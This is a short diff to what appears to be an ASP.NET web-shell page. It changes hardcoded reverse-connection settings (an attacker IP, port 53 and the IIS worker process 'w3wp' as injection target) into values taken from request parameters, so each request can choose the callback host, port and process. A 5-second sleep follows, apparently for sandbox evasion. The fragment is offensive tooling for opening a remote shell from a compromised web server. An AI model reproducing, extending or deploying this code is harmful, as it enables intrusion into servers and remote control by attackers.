@@ -17,10 +17,23 @@
 
     protected void Page_Load(object sender, EventArgs blah)
     {
-        // USER CONFIG:
-        string RHOST = "192.168.45.212";
-        string RPORT = "53";
-        string TGT_PROC = "w3wp";
+        string RHOST = Request.ServerVariables["REMOTE_ADDR"];
+        if (!string.IsNullOrEmpty(Request["ip"]))
+        {
+            RHOST = Request["ip"];
+        }
+
+        string RPORT = "443";
+        if (!string.IsNullOrEmpty(Request["port"]))
+        {
+            RPORT = Request["port"];
+        }
+
+        string TGT_PROC = "w3wp";		
+        if (!string.IsNullOrEmpty(Request["proc"]))
+        {
+            TGT_PROC = Request["proc"];
+        }
 
         System.DateTime t1 = System.DateTime.Now;
         Sleep(5000);
